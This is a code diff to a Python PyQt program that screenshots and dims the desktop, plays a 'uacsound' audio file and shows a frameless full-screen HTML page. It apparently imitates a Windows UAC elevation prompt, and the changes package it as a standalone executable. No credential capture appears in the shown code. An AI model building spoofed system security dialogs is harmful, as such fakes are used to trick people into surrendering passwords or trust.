@@ -6,6 +6,14 @@ import cv2, numpy as np
 import subprocess as sp
 from subprocess import CREATE_NEW_CONSOLE
 import sys, os
+from os.path import join, dirname
+
+def resource_path(relative_path: str) -> str:
+    if getattr(sys, 'frozen', False):
+        base_path = dirname(sys.executable)
+    else:
+        base_path = dirname(__file__)
+    return join(base_path, relative_path)
 
 def apply_black_blur(filename: str, output: str = "output.jpg", blur_strength: int = 25, darkness: float = 0.5):
     img = cv2.imread(filename)
@@ -62,8 +70,10 @@ def main():
     screenshot("background.png")
     apply_black_blur("background.png", "background.png")
     app = QtWidgets.QApplication(sys.argv)
-    html_file = os.path.abspath("index.html")
-    play_mp3_background(os.path.join("assets", "uacsound.mp3"))
+    html_file = resource_path("index.html")
+    uac_sound_file = resource_path(join("assets", "uacsound.mp3"))
+
+    play_mp3_background(uac_sound_file)
     window = QtWidgets.QWidget()
     window.setWindowFlags(
         QtCore.Qt.FramelessWindowHint |
@@ -90,6 +100,8 @@ def main():
     layout.addWidget(view)
 
     window.showFullScreen()
+    try:os.remove("background.png")
+    except:...
     sys.exit(app.exec_())
 
 
